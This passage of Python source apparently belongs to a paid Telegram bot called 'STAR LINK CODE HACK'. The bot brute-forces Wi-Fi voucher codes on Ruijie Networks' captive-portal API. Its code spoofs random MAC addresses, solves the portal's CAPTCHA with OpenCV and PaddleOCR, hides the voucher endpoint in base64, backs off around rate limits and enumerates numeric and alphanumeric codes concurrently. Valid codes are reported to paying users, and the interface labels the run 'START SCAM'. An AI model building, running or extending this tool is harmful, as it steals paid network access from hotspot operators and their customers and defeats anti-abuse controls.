        await bot.answer_callback_query(call.id, f"  Proxy {status_text}               ")
        return

    if call.data == "menu_back":
        if user_id in paid_users or user_id in approve:
            proxy_enabled = db_get_proxy_setting(user_id)
            status_text = "ON" if proxy_enabled else "OFF"
            emoji = " " if proxy_enabled else " "
            text = f"  STAR LINK CODE HACK  \n\n  NAME: {user_name}\n  USER ID: {user_id}\n\n  PAID USER - Unlimited Access\n{emoji} Proxy Status: {status_text}"
        else:
            text = f"  STAR LINK CODE HACK  \n\n  NAME: {user_name}\n  USER ID: {user_id}\n\n        user ID     registered             "
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            if is_admin(user_id):
                approve[chat_id] = True
                paid_users[user_id] = True
            else:
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                    text=f"       user ID     registered             ",
                    reply_markup=get_back_keyboard())
                await bot.answer_callback_query(call.id)
                return
        text = f"  Portal URL             :\n\n/portal [your_portal_url]"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_paid":
        if is_admin(user_id):
            approve[chat_id] = True
            paid_users[user_id] = True
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"         Admin            KEY           ",
                reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        text = f"  PAID USER              KEY               :\n\nUSER ID: {user_id}"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_paid_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_enter_key":
        if is_admin(user_id):
            await bot.send_message(chat_id, f"         Admin            KEY           ")
            await bot.answer_callback_query(call.id)
            return
        await bot.send_message(chat_id, f"       KEY               :\n\n/key [your_key_here]")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="       user ID     registered             ",
                reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        results = db_get_results(user_id)
        text = "  Found Codes:\n" + "\n".join(results) if results else "            success code           "
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="       user ID     registered             ",
                reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="              Portal URL                   :\n\n/portal [url]",
                reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text="  Recheck                ...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "  Scan                      ", show_alert=True)
        return

    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="  VOUCHER                       ",
                reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        progress_msg = await bot.send_message(chat_id, "  Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'], scan_id,
            message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="  Portal URL                   :\n\n/portal [url]",
                reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"  DIGIT {mode}                               -",
                reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=f"  Mode: {mode}\n\n  START SCAM                  ",
            reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=f"  VOUCHER Mode: {mode}\n         : {digit}\n\n  START SCAM                  ",
            reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

# ==================== ADMIN COMMANDS ====================
async def listkeys_command(message):
    keys = db_get_all_keys()
    if not keys:
        await bot.reply_to(message, "  Registered key           ")
        return
    lines = []
    for key, data in keys.items():
        user_info = db_get_user_by_key(key)
        user_id = user_info["user_id"] if user_info else "Not Registered"
        lines.append(f"  `{key}`\n     User: {user_id}\n     Plan: {data['plan']}\n     Limit: {data['used_codes']}/{data['code_limit']}")
    text = f"  Registered Keys ({len(keys)})\n\n" + "\n\n".join(lines)
    await bot.reply_to(message, text, parse_mode="Markdown")

async def stats_command(message):
    keys = db_get_all_keys()
    users = db_get_all_users()
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"  **Bot Statistics**\n\n  Uptime: {hours}h {minutes}m {seconds}s\n  Total Keys: {len(keys)}\n  Registered Users: {len(users)}",
        parse_mode="Markdown"
    )

async def users_list_command(message):
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, "  User           ")
        return
    lines = [f"  ID: `{uid}`" for uid in users]
    text = f"   **Users List** ({len(users)})\n\n" + "\n".join(lines)
    await bot.reply_to(message, text, parse_mode="Markdown")

# ==================== ADVANCED CV2 & NON-BLOCKING PADDLEOCR (Asyncio.to_thread) ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

_ocr = None
def get_ocr():
    global _ocr
    if _ocr is None:
        try:
            # PaddleOCR initialization
            _ocr = PaddleOCR(lang='en')
        except Exception as e:
            logger.error(f"PaddleOCR init error: {e}")
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = get_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        
        # ၁။ အရွယ်အစား ကြီးမားစွာ ချဲ့ခြင်း (High-Resolution Upscaling)
        scaled = cv2.resize(img, None, fx=3.5, fy=3.5, interpolation=cv2.INTER_CUBIC)
        
        # ၂။ မီးခိုးရောင်သို့ ပြောင်းလဲခြင်း
        gray = cv2.cvtColor(scaled, cv2.COLOR_BGR2GRAY)
        
        # ၃။ Non-local Means Denoising (အကောင်းဆုံး ဆူညံသံဖယ်ရှားခြင်း)
        denoised = cv2.fastNlMeansDenoising(gray, h=30)
        
        # ၄။ Otsu's Thresholding (အလိုအလျောက် အကောင်းဆုံး အဖြူ/အမည်း ခွဲထုတ်ခြင်း)
        _, thresh = cv2.threshold(denoised, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        
        # ၅။ Morphological Operations (စာလုံးကွဲများကို ဆက်ပေးပြီး အစက်အပြောက်ဖျောက်ခြင်း)
        kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
        processed = cv2.morphologyEx(thresh, cv2.MORPH_CLOSE, kernel)
        
        # PaddleOCR ဗားရှင်းအသစ်များအတွက် ocr() အစား predict() ကိုသာ အသုံးပြုခြင်း (Warning လုံးဝမတက်တော့ပါ)
        texts = []
        result = None
        
        try:
            if hasattr(ocr, 'predict'):
                result = ocr.predict(processed)
            else:
                result = ocr.predict(processed)
        except Exception:
            result = None

        if result:
            if hasattr(result, '__iter__') and not isinstance(result, (str, bytes, dict)):
                try:
                    result_list = list(result)
                except:
                    result_list = [result]
            else:
                result_list = [result]

            for res in result_list:
                if res is None:
                    continue
                if hasattr(res, 'json'):
                    try:
                        res = res.json()
                    except:
                        pass
                
                if isinstance(res, dict):
                    for k, v in res.items():
                        if isinstance(v, list):
                            for sub in v:
                                if isinstance(sub, dict):
                                    for sk, sv in sub.items():
                                        if isinstance(sv, str) and len(sv) <= 15:
                                            texts.append(sv)
                                        elif isinstance(sv, list):
                                            for item in sv:
                                                if isinstance(item, str):
                                                    texts.append(item)
                                elif isinstance(sub, (list, tuple)) and len(sub) > 0:
                                    texts.append(str(sub[0]))
                        elif isinstance(v, str):
                            texts.append(v)
                elif isinstance(res, (list, tuple)):
                    for line in res:
                        if line is None:
                            continue
                        if isinstance(line, str):
                            texts.append(line)
                        elif isinstance(line, (list, tuple)):
                            for item in line:
                                if isinstance(item, str):
                                    texts.append(item)
                                elif isinstance(item, (list, tuple)) and len(item) > 0:
                                    if isinstance(item[0], str):
                                        texts.append(item[0])
                                    elif len(item) > 1:
                                        sub_item = item[1]
                                        if isinstance(sub_item, (list, tuple)) and len(sub_item) > 0:
                                            if isinstance(sub_item[0], str):
                                                texts.append(sub_item[0])
                                        elif isinstance(sub_item, str):
                                            texts.append(sub_item)
                elif hasattr(res, 'text'):
                    texts.append(str(res.text))
                else:
                    s = str(res)
                    if s and len(s) < 100:
                        texts.append(s)

        if not texts and result is not None:
            clean_fallback = re.sub(r'[^a-zA-Z0-9]', '', str(result))
            if clean_fallback:
                return clean_fallback.upper().strip()

        full_text = "".join(texts)
        clean_text = re.sub(r'[^a-zA-Z0-9]', '', full_text)
        return clean_text.upper().strip() if clean_text else None

    except Exception as e:
        logger.error(f"Advanced CV2 Pipeline & PaddleOCR processing error: {e}")
        return None

async def Captcha_Text(image_bytes):
    # OCR Caching & Non-blocking thread execution
    img_hash = hash(image_bytes)
    with _ocr_cache_lock:
        if img_hash in _ocr_cache:
            return _ocr_cache[img_hash]
    
    result = await asyncio.to_thread(_ocr_sync, image_bytes)
    if result:
        with _ocr_cache_lock:
            if len(_ocr_cache) > 2000:
                _ocr_cache.clear()
            _ocr_cache[img_hash] = result
    return result

# ==================== CAPTCHA / API PART ====================
async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as req:
            return await req.read()
    except Exception as e:
        return None

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=aiohttp.ClientTimeout(total=8)) as req:
            data = await req.json()
            if data.get("success") == True:
                return session_id
            return None
    except Exception as e:
        return None

async def Code_Expires_Date(session, active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}'
    ]
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    for url in paths:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as req:
                if req.status == 200:
                    data = await req.json()
                    if data.get('success'):
                        result = data.get('result', {})
                        raw_minutes = result.get('totalMinutes') or result.get('remainingMinutes')
                        profile_name = result.get('profileName', 'Unknown')
                        if raw_minutes is not None:
                            mins = int(raw_minutes)
                            hh, mm = divmod(mins, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                            return f"  Plan: {profile_name} |   Time: {time_str}", raw_minutes
        except:
            continue
    return "  Plan: Unknown |   Time: Unknown", 'Unknown'

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    backoff = 0.2
    for attempt in range(3):  # Error Handling & Retry Logic
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=TIMEOUT)
            ) as session:
                session_id = await get_session_id(session, session_url, None)
                if not session_id:
                    return
                auth_code = None
                for _ in range(3):
                    try:
                        img = await Captcha_Image(session, session_id)
                        if not img:
                            continue
                        text = await Captcha_Text(img)
                        if not text or len(text) < 3:
                            continue
                        verified = await Varify_Captcha(session, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except Exception:
                        pass
                if not auth_code:
                    return
                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return
                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "content-type": "application/json",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                }
                async with session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    if response and 'request limited' in response.lower():
                        await asyncio.sleep(backoff)
                        backoff *= 2
                        continue
                    break
        except Exception as e:
            logger.error(f"perform_check attempt {attempt+1} error: {e}")
            await asyncio.sleep(0.3)
            continue
    else:
        return

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar()) as temp_sess:
            expire_date, _ = await Code_Expires_Date(temp_sess, session_id)
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append(f"  {code}\n   {expire_date}")
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)
        user_info = db_get_user(str(chat_id))
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info:
                db_update_used_codes(user_info["key"], key_info["used_codes"] + 1)
        if message:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"  **Success Hit Found!**\n\n  Code: `{code}`\n{expire_date}", parse_mode="Markdown")
            except:
                pass

# --- Code generators, run_bruteforce, send_success_file ---
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def engmixed_generator(length):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    raise ValueError(f"Unsupported mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None and total > 0:
        bar_length = 20
        percent = min(100, (checked / total) * 100)
        filled = int(percent / 5)
        bar = " " * filled + " " * (bar_length - filled)
        return f"  Scanning VOUCHER Codes...\n\n  Checked : {checked:,}/{total:,}\n  Progress : {percent:.2f}%\n  Speed : {speed_str}\n  Success hit : {found}\n[{bar}]"
    return f"  Scanning VOUCHER Codes...\n\n  Checked : {checked:,}\n  Speed : {speed_str}\n  Success hit : {found}\n  Status : running\n"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    global _voucher_sem
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    else:
        total = None
    checked = 0
    scan_start = time.monotonic()
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break
            batch = [next(code_iter, None) for _ in range(BATCH_SIZE)]
            batch = [c for c in batch if c is not None]
            if not batch:
                break
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            if progress_msg and checked % 100 == 0:
                text = format_progress(checked, total, speed, found)
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
                except:
                    pass
        await send_success_file(chat_id)
    except asyncio.CancelledError:
        await send_success_file(chat_id)
    finally:
        scan_tasks.pop(chat_id, None)

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"success_codes_{chat_id}_{timestamp}.txt"
            content = "\n\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption=f"  Found {len(success_texts[chat_id])} Success Codes")
            os.remove(filename)
        except Exception as e:
            logger.error(f"send_success_file error: {e}")

# ==================== WEB SERVER & MAIN ====================
async def handle(request):
    return web.Response(text="Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def start_polling():
    while True:
        try:
            await bot.infinity_polling(timeout=90, request_timeout=90, skip_pending=True)
            return
        except Exception as e:
            logger.error(f"Polling error: {e}. Reconnecting...")
            await asyncio.sleep(5)

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        limit_per_host=CONNECTION_PER_HOST,
        ttl_dns_cache=600,
        ssl=False
    )
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        async with _connector:
            pass

if __name__ == '__main__':
    asyncio.main(main()) if hasattr(asyncio, 'main') else asyncio.run(main())
